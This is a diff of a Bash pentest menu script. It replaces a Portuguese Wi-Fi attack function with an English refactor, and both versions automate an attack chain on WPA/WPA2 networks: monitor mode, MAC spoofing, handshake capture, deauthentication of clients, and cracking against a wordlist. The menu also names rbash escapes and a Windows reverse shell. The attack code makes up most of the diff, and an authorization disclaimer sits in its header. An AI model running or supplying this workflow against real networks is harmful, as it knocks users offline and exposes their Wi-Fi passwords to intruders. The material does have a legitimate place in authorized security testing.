@@ -3,7 +3,7 @@
 # TODO: Extracting URLs from a Web Page - Web and Internet Users (177) - Chapter 7 - Wicked Cool Scripts
 
 # Version
-VERSION="0.18.1"
+VERSION="0.19.0"
 # Darth Release
 RELEASE="ANAKIN"
 #* ====== CONSTANTS ======
@@ -322,7 +322,7 @@ RELEASE="ANAKIN"
         echo -e "${GREEN} [15] Root Password Reset Guide (Linux OS) ${RESET}"
         echo -e "${GREEN} [16] How to Use VIm (Quick Ref) ${RESET}"
         echo -e "${GREEN} [17] Rbash Escape Techniques (Linux OS)${RESET}"
-        echo -e "${GRAY} [18] Wireless Network Attacks ${RESET}"
+        echo -e "${GREEN} [18] Wireless Penetration Testing Toolkit ${RESET}"
         echo -e "${GRAY} [19] Windows Tips ${RESET}"
         echo -e "${GRAY} [20] Create Scripts in .bat or .ps1 ${RESET}"
         echo -e "${GRAY} [21] Reverse Shell for Windows ${RESET}"
@@ -377,7 +377,7 @@ RELEASE="ANAKIN"
                 15) linux_root_password_reset ;; 
                 16) vim_quick_reference ;;
                 17) rbash_escape_methods ;;  
-                18) xviii_wifi_attacks ;;  
+                18) wireless_pentest ;;  
                 19) xix_windows_basic_commands ;;  
                 21) xxi_sgt_domingues_scanning_script ;;  
                 22) xxii_nmap_network_discovery ;;  
@@ -2758,172 +2758,119 @@ RELEASE="ANAKIN"
         rbash_escape_workflow
     }
 
+    # Function: Wireless Penetration Testing Toolkit
+    function wireless_pentest() {
+        # wireless_pentest - Conducts penetration testing on Wi-Fi networks
+            #
+            # Description:
+            #   Automates various attacks and reconnaissance techniques on wireless networks.
+            #   Features include monitor mode activation, handshake capture, deauthentication, and password cracking.
+            #
+            # Features:
+            #   - Enables monitor mode & MAC spoofing
+            #   - Captures network traffic & handshake authentication
+            #   - Conducts deauthentication attacks on clients
+            #   - Cracks captured handshakes using wordlists
+            #
+            # Output:
+            #   - Saves logs for further analysis
+            #
+            # Author: Z1GSN1FF3R || R3v4N || 0wL (Refactored w/GPT)
+            # Created on: 2021-01-27
+            # Last Updated: 2025-01-30
+            # Version: 2.0
+            #
+            # Usage:
+            #   Run this function to perform a full wireless penetration test.
+            #
+            # Notes:
+            #   - Requires root privileges
+            #   - Use responsibly & ethically
+            #   - Ensure you have permission before testing any network
 
+        title="WIRELESS PENETRATION TESTING TOOLKIT"  # Title
 
+        # Function: Disable monitor mode if active
+        function disable_monitor_mode() {
+            log_and_display "=== Stopping monitor mode ==="
+            airmon-ng stop mon0 2>/dev/null
+        }
 
+        # Function: Display available wireless interfaces
+        function list_available_interfaces() {
+            log_and_display "=== Available Wireless Interfaces ==="
+            airmon-ng
+        }
 
+        # Function: Enable monitor mode & spoof MAC address
+        function configure_monitor_mode() {
+            log_and_display "=== Configuring Monitor Mode ==="
+            ifconfig "$INTERFACE" down
+            iw dev "$INTERFACE" interface add mon0 type monitor
+            macchanger -r mon0
+            airmon-ng check kill  # Kill interfering processes
+        }
 
+        # Function: Passive network monitoring
+        function passive_network_monitoring() {
+            local timestamp
+            timestamp=$(date +"%d%H%M%b%y")
+            log_and_display "=== Starting Passive Network Monitoring ==="
+            airodump-ng mon0 --write "monitoring_log_$timestamp"
+        }
+
+        # Function: Targeted AP scanning
+        function scan_target_ap() {
+            log_and_display "=== Scanning Target Access Point ==="
+            read -r -p "Enter Target AP BSSID (MAC Address): " MACTARGET
+            read -r -p "Enter Target AP Channel: " CHANNEL
+            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_log
+        }
+
+        # Function: Capture WPA/WPA2 handshake
+        function capture_handshake() {
+            log_and_display "=== Capturing 4-Way Handshake ==="
+            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write handshake_log &
+        }
+
+        # Function: Conduct deauthentication attack
+        function deauthentication_attack() {
+            log_and_display "=== Deauth Attack: Disconnecting Clients ==="
+            read -r -p "Enter Client MAC to Deauthenticate: " CLIENTMAC
+            for ((i=1; i<=3; i++)); do
+                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLIENTMAC" mon0 | tee -a deauth_log
+                log_and_display "Sleeping 5 seconds between attacks..."
+                sleep 5
+            done
+        }
+
+        # Function: Crack WPA/WPA2 handshake with wordlist
+        function crack_handshake() {
+            log_and_display "=== Cracking Captured Handshake ==="
+            aircrack-ng handshake_log*.cap -w /usr/share/wordlists/rockyou.txt
+        }
+
+        # Execution Workflow
+        function wireless_pentest_workflow() {
+            display_banner_inside_functions
+            disable_monitor_mode
+            list_available_interfaces
+            configure_monitor_mode
+            passive_network_monitoring
+            scan_target_ap
+            capture_handshake
+            deauthentication_attack
+            crack_handshake
+            exit_to_main_menu
+        }
+
+        # Start Wireless Pentest Workflow
+        wireless_pentest_workflow
+    }
 
 
 #! TODO: UPDATE ALL BELOW HERE. The main objective is translate to english and if necessary, refactor the code.
 
-    # Este script realiza testes de penetração em redes wireless
-    function xviii_wifi_atk(){
-        ##############################################################
-        #
-        #           Wireless Pentest 
-        #
-        #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
-        #
-        #           DATA: 01-27-2021
-        #           REFATORADO: 04-22-2024    
-        #   
-        #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
-        #
-        #
-        ##############################################################
-        
-        # Função para executar configurações preliminares antes do ataque
-        function pre_configuracoes(){
-            # Descrição: Desliga a interface 'mon0' do modo monitor.
-
-            airmon-ng stop mon0
-
-            # Explicação:
-
-            # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
-            # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
-            # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.
-
-            # Observações:
-
-            # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
-            # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
-        }
-
-        # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
-        function interfaces_disponiveis(){
-            clear
-            #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
-            #echo ""
-            #echo "=========== IW DISPONIVEIS ============="
-            #airmon-ng
-            #echo "=========== MONITOR MODE ============="
-            #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
-            #echo "======================================"
-            #echo ""
-        }        
-
-        # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
-        function configuracoes_iniciais(){
-            # Desativa a interface de rede
-            ifconfig "${INTERFACE}" down
-
-            # Adiciona uma nova interface em modo monitor chamada mon0
-            iw dev "${INTERFACE}" interface add mon0 type monitor
-
-            # Altera o endereço MAC da interface mon0
-            macchanger -r mon0
-
-            # Verifica se há processos em execução que podem interferir e os encerra
-            airmon-ng check kill #kill the process that maybe cause some problem
-
-            # Solicita ao usuário para pressionar ENTER para continuar
-            echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
-        }
-
-        # Função para iniciar o monitoramento em modo promíscuo
-        function monitoramento_promiscuo(){
-            # Obtém o timestamp atual para nomear o arquivo de log
-            local timestamp
-            timestamp=$(date +"%d%H%M%b%y")    
-
-            # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
-            airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
-        }
-
-        # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
-        function scan_ap_alvo(){    
-            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
-            echo "============================================"
-
-            # Solicita ao usuário o BSSID (MAC do AP) do alvo
-            read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET
-
-            # Solicita ao usuário o canal do AP
-            read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID
-
-            echo "============================================"
-            echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
-
-            # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
-            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
-        }
-
-        # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
-        function captura_4whsk(){
-            # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
-            # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
-            # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
-            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
-        }
-
-        # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
-        function ataque_deauth(){  
-            echo ""
-            echo "============================================"
-            read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
-            echo "============================================"
-            echo ""
-            # Deauth no cliente
-            for ((i=1;i<=3;i++)); do
-                # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
-                # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
-                # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
-                # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
-                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
-                # Mensagem para informar o intervalo entre os ataques de desautenticação
-                echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
-                if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
-                    sleep 5
-                fi
-            done
-        }
-
-        # Função para quebrar a senha usando um dicionário de palavras
-        function quebra_senha_dicionario(){
-            aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
-        }
-
-        # Função principal para executar todas as etapas do ataque
-        function main_wifi_atk(){
-            # Executa as configurações pré-ataque
-            pre_configuracoes;
-            # Verifica as interfaces disponíveis
-            interfaces_disponiveis;
-            # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
-            configuracoes_iniciais;
-            # Inicia o monitoramento em modo promíscuo
-            monitoramento_promiscuo;
-            # Escaneia o AP alvo e grava os resultados em um arquivo de log
-            scan_ap_alvo;
-            # Captura o handshake de autenticação entre o cliente e o AP alvo
-            captura_4whsk;
-            # Realiza um ataque de desautenticação no cliente especificado
-            ataque_deauth;
-            # Tenta quebrar a senha utilizando um dicionário
-            quebra_senha_dicionario;
-            # Mensagem para pressionar ENTER para continuar
-            echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
-            read -r 2> /dev/null
-            # Chamada da função principal do menu principal após pressionar ENTER
-            main_menu;  
-        }
-
-        # Chama a função principal
-        main_wifi_atk;
-
-    }
 
     #
     function xix_cmd_basicos_windows(){
